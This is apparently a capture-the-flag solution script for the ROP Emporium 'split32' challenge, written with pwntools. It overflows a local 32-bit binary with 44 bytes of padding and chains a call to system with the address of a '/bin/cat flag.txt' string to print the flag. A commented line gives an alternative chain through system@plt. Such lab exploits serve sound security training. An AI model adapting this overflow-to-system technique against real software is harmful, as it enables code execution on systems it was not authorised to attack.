#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

context.log_level = 'critical'

elf = ELF('./split32')
cat = p32(elf.symbols['usefulString'])  # /bin/cat flag.txt

rop = "A" * 44
rop += p32(0x08048657)                  # system in usefulFunction
# OR
#rop += p32(0x8048430)                  # system@plt
#rop += p32(0x080483de)                 # add esp, 8 ; pop ebx ; ret
rop += cat

p = elf.process()
print p.recvuntil('>')
p.sendline(rop)
p.interactive()
